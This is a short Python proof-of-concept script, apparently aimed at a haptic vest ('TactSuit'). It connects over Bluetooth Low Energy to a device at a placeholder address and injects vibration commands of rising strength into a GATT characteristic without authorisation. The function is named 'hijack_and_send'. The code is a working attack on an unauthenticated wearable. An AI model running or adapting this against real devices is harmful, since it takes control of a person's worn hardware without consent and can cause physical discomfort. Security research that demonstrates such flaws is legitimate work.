#inject_tactsuit.py
#!/usr/bin/env python3
import asyncio
from contextlib import suppress
from bleak import BleakClient

ADDRESS = "aa:bb:cc:dd:ee:ff"
UUIDS = ["12345-12345-12345-12345"]

# Desired vibration strength and hold duration (in seconds)
SEQUENCES = [
    (bytes([30]), 4.0),   # Strength 30 for 4 seconds
    (bytes([50]), 4.0),   # Strength 50 for 4 seconds
    (bytes([200]), 4.0),  # Strength 200 for 4 seconds
]

CONNECT_TIMEOUT = 6.0
RETRY_DELAY = 0.8
WRITE_WITH_RESPONSE = True   # Use write with response to ensure order and delivery

async def hijack_and_send():
    while True:
        client = BleakClient(ADDRESS, timeout=CONNECT_TIMEOUT)
        try:
            await client.connect()
            if not client.is_connected:
                raise RuntimeError("Connected flag false")

            # For each strength: write the strength → wait for the specified time → write OFF (0)
            for uuid in UUIDS:
                for payload, hold_sec in SEQUENCES:
                    # Start vibration
                    await client.write_gatt_char(uuid, payload, response=WRITE_WITH_RESPONSE)
                    print(f"Start vibration {uuid} -> {list(payload)} for {hold_sec}s")
                    await asyncio.sleep(hold_sec)

                    # Stop vibration (OFF)
                    await client.write_gatt_char(uuid, bytes([0]), response=WRITE_WITH_RESPONSE)
                    print(f"Stop vibration {uuid} -> [0]")

                    # Short pause between vibrations (adjust if needed)
                    await asyncio.sleep(0.3)

            return  # Exit after all sequences are sent

        except Exception as e:
            print(f"connect/write failed: {repr(e)}")
            await asyncio.sleep(RETRY_DELAY)
        finally:
            with suppress(Exception):
                await client.disconnect()

if __name__ == "__main__":
    asyncio.run(hijack_and_send())
